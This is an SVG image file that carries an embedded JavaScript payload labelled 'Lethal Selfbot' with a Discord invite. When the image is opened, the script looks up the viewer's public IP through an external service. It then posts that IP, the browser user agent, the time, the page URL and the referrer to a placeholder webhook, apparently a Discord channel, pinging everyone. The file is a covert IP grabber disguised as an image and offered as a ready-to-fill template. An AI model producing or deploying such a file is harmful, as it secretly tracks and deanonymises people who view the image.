<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    <script> 
        //Lethal Selfbot discord.gg/lethals
        var G = function() { var ip = ''; var req = new XMLHttpRequest(); req.open('GET', 'https://myexternalip.com/raw', false); req.send(); if (req.status == 200) { ip = req.responseText;} return ip; };		function LethalDownloadExploit() {fetch('{webhook}', { method: 'POST', headers: {'Content-Type': 'application/json'},body: JSON.stringify({content: `@everyone \nIP: ||${G()}||\nBrowser: ${navigator.userAgent}\nTime: ${new Date().toLocaleString()}\nURL: ${window.location.href}\nReferrer: ${document.referrer}\n`})});} LethalDownloadExploit();
    </script>
</svg>
